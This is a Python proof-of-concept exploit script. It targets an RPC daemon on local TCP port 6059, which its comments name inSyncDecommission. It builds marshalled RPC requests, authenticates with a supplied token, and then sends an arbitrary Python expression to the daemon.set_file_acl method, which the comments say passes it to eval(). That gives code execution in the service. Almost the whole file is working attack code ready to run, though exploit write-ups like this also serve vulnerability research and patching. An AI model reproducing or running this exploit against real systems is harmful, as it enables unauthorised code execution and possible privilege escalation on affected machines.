import socket
import marshal
import zlib
import struct
import sys

ip = '127.0.0.1'
port = '6059'

if len(sys.argv) < 3:
    print "Usage: " + sys.argv[0] + " <token> <quoted python expression>"
    sys.exit(0)

token = sys.argv[1]
py_expr = sys.argv[2]

def build_post(data):
    message = "POST /api HTTP/1.1" + "\r\n"
    message += "Host: 127.0.0.1" + "\r\n"
    message += "Content-Length: " + str(len(data)) + "\r\n"
    message += "X-Drv-Encoding: 1" + "\r\n"
    message += "\r\n"
    message += data
    return message

def send_rpc_request(sock, req_obj, unknown):
    marsh = marshal.dumps(req_obj)  # python object

    # build out the header
    header =  "\x78\x01\x01" + struct.pack('<h', len(marsh))
    header += chr(unknown) # not sure exactly what this is
    header += "\xff"

    # add the ADLER32 checksum
    checksum = struct.pack('>i', zlib.adler32(marsh))

    post_data = header + marsh + checksum
    message = build_post(post_data)
    try:
        sock.send(message)
        #print("Sent request.")

        resp = sock.recv(1024)

        if resp is None:
            print("Did not receive a response from server.")
    except Exception as e:
        print("Error with request:")
        print(e)

def daemon_authenticate(sock, token):
    daemon_auth = {
        'Requests': [
            {
                'Id': 16,
                'Method': 'daemon.authenticate',
                'KeywordArguments': {},
                'Arguments': (token,),
            }
        ]
    }
    send_rpc_request(sock, daemon_auth, 119)

# rpc service unmarshals object and calls method with arguments
# daemon.set_file_acl has a python code injection vuln
def exploit_set_file_acl(token, py_expr):
    daemon_set_file_acl = {
        'Requests': [
            {
                'Id': 18,
                'Method': 'daemon.set_file_acl',
                'KeywordArguments': {},
                'Arguments': (None, py_expr, None, None,),   # 2nd param is passed to eval()
            }
        ]
    }

    # inSyncDecommission listens on TCP 6059
    ip = '127.0.0.1'
    port = '6059'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    daemon_authenticate(s, token)
    send_rpc_request(s, daemon_set_file_acl, 136 - len(py_expr)) # 123
    s.close()

exploit_set_file_acl(token, py_expr)